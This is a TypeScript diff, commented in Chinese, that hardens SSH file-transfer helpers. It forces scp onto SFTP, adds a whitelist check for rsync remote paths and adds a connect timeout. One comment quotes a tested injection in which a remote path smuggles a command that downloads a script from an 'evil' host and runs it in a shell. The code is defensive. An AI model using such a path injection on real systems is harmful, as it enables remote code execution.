@@ -172,7 +172,7 @@ function runProcess(
           new Error(
             err.message.includes('ENOENT')
               ? `The \`${bin}\` command was not found on this machine.`
-              : `Failed to run ssh: ${err.message}`
+              : `Failed to run ${bin}: ${err.message}`
           )
         )
       )
@@ -219,15 +219,6 @@ export async function sshExec(opts: {
 /** 传输方向：up = 本地→远端，down = 远端→本地 */
 export type TransferDirection = 'up' | 'down'
 
-/** 跑一个任意二进制（scp / rsync 与 ssh 共用同一套超时 / 中止 / 输出收集） */
-function runBin(
-  bin: string,
-  args: string[],
-  opts: { timeoutSec: number; signal?: AbortSignal }
-): Promise<SshExecResult> {
-  return runProcess(bin, args, opts)
-}
-
 /**
  * 文件传输（scp）。
  *
@@ -249,6 +240,10 @@ export async function sshCopy(opts: {
   const sock = controlPath(opts.sessionId, opts.alias)
   const remote = `${opts.alias}:${opts.remotePath}`
   const args = [
+    // `-s` 把协议钉在 SFTP 上。OpenSSH 9 之前 scp 默认走**旧 SCP 协议**，那条路会在远端
+    // 拼出一条命令行、由远端 shell 求值 —— 远端路径里的 `;` 就成了远端命令执行。
+    // 走 SFTP 时路径是协议里的一个字段，原样抵达，不经任何 shell。
+    '-s',
     ...configArgs(opts.configPath),
     '-o',
     'BatchMode=yes',
@@ -259,7 +254,7 @@ export async function sshCopy(opts: {
     ...(opts.direction === 'up' ? [opts.localPath, remote] : [remote, opts.localPath])
   ]
   log.info(`scp ${opts.direction} ${opts.alias}: ${opts.remotePath}`)
-  return runBin('scp', args, { timeoutSec: opts.timeoutSec, signal: opts.signal })
+  return runProcess('scp', args, { timeoutSec: opts.timeoutSec, signal: opts.signal })
 }
 
 /** rsync 探测结果（进程级缓存：一台机器上装没装 rsync 不会在运行期变） */
@@ -274,11 +269,29 @@ let rsyncProbe: Promise<boolean> | undefined
  */
 export function rsyncAvailable(): Promise<boolean> {
   if (!rsyncProbe) {
-    rsyncProbe = runBin('rsync', ['--version'], { timeoutSec: 5 })
+    rsyncProbe = runProcess('rsync', ['--version'], { timeoutSec: 5 })
       .then((r) => r.exitCode === 0)
       .catch(() => false)
   }
   return rsyncProbe
+}
+
+/**
+ * rsync 的远端路径**必须**过这道白名单。
+ *
+ * rsync 不像 scp 那样有协议字段可放路径：它把远端路径塞进一条交给 ssh 的 argv，
+ * 而 ssh 会把剩余参数用空格拼成一条命令交给远端**登录 shell** 求值。实测
+ * `rsync -e ssh -- src 'prod:/tmp/x; curl http://evil|sh'` 会在远端真的执行那条 curl。
+ * 所以这里用白名单而不是黑名单 —— 少列一个危险字符的代价是远端命令执行。
+ * 需要更花的路径就用 exec（它过命令门）或 upload/download（它们走 SFTP，路径原样抵达）。
+ */
+const SAFE_REMOTE_PATH = /^~?[A-Za-z0-9._/@+:=-]*$/
+
+export function unsafeRemotePathReason(remotePath: string): string | undefined {
+  if (!SAFE_REMOTE_PATH.test(remotePath)) {
+    return `The remote path ${JSON.stringify(remotePath)} contains characters that rsync would hand to the remote shell. Use only letters, digits and ._/@+:=- (a leading ~ is allowed). For anything else use exec, or upload/download, which pass the path over SFTP instead.`
+  }
+  return undefined
 }
 
 /**
@@ -305,6 +318,8 @@ export async function sshSync(opts: {
     ...configArgs(opts.configPath),
     '-o',
     'BatchMode=yes',
+    '-o',
+    `ConnectTimeout=${CONNECT_TIMEOUT_SEC}`,
     ...multiplexArgs(sock)
   ].join(' ')
   const remote = `${opts.alias}:${opts.remotePath}`
@@ -316,7 +331,7 @@ export async function sshSync(opts: {
     ...(opts.direction === 'up' ? [opts.localPath, remote] : [remote, opts.localPath])
   ]
   log.info(`rsync ${opts.direction} ${opts.alias}: ${opts.remotePath}`)
-  return runBin('rsync', args, { timeoutSec: opts.timeoutSec, signal: opts.signal })
+  return runProcess('rsync', args, { timeoutSec: opts.timeoutSec, signal: opts.signal })
 }
 
 /** 关掉某台主机的 master（`ssh -O exit`）。返回「本来是否连着」 */
